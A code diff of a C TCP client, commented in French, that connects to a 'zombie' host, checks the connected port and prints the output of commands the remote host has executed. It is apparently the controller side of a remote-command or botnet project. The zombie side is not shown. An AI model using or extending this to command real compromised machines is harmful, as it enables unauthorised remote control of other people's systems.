@@ -19,6 +19,7 @@
  */
 int createConnection(char * ip, int port) {
     int sock;
+    //struct sockaddr_in addr;
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         perror("Erreur lors de la création du socket");
@@ -36,7 +37,7 @@ int createConnection(char * ip, int port) {
 
 int main(int argc, char **argv) {
     if (argc < 3) {
-        printf("faut mettre l'ip et le port ");
+        printf("IP || PORT -> missing ");
         return 1;
     }
     char *ip = argv[1];
@@ -46,6 +47,22 @@ int main(int argc, char **argv) {
         printf("Impossible de créer une connexion\n");
         return 1;
     }
+
+    // verif du port 
+    struct sockaddr_in addr;
+    socklen_t addr_len = sizeof(addr);
+    getpeername(sock, (struct sockaddr *)&addr, &addr_len);
+    int connectedPort = ntohs(addr.sin_port);
+
+    if(connectedPort != port){
+        printf("\n ce n'est pas le meme port que le zombie \n");
+        close(sock);
+        return 1;
+
+    }
+
+    //printf("port du zombie = %d ",connectedPort);
+
     printf("Connexion établie avec %s:%d\n", ip, port);
    char buffer[BUF_SIZE];
     while (1) {
@@ -70,7 +87,7 @@ int main(int argc, char **argv) {
 
         buffer[message_recu] = '\0';
 
-        printf(" reponse =    %s",buffer);
+        printf("Reponse de la commande executé =   \n %s",buffer);
     }
     close(sock);
     return 0;
